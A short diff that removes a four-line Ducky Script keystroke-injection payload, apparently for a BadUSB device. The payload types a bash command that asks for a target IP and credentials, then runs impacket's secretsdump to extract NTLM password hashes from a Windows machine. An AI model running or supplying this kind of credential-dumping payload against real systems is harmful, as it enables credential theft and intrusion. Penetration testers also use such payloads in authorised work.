@@ -1,4 +1,0 @@
-REM Run secretsdump to extract NTLM hashes from a Windows SAM (impacket)
-DELAY 500
-STRING read -p "Target IP: " ip; read -p "Domain (or . for local): " dom; read -p "Username: " u; read -p "Password: " p; impacket-secretsdump "$dom/$u:$p@$ip" 2>/dev/null || python3 /usr/share/doc/python3-impacket/examples/secretsdump.py "$dom/$u:$p@$ip"
-ENTER
